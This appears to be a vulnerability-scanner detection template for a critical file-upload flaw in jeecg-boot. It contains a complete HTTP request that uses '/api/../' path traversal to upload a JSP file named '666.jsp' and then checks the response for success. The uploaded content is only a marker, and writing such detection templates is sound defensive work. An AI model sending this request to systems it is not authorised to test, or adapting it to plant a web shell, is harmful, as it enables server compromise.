id: jeecg-boot-upload

info:
  name: jeecg-boot-upload
  severity: critical
  author:

rules:
  r0:
    request:
      method: POST
      path: /api/../commonController.do?parserXml
      follow_redirects: false
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=---------------------------37624949489622594842194829405
        Origin: null
        Upgrade-Insecure-Requests: 1
        Te: trailers
        Connection: close
      body: "-----------------------------37624949489622594842194829405\r\nContent-Disposition: form-data; name=\"file\"; filename=\"666.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n111\r\n-----------------------------37624949489622594842194829405--"
    expression: response.status == 200 && response.body_string.contains('操作成功')

expression: r0()
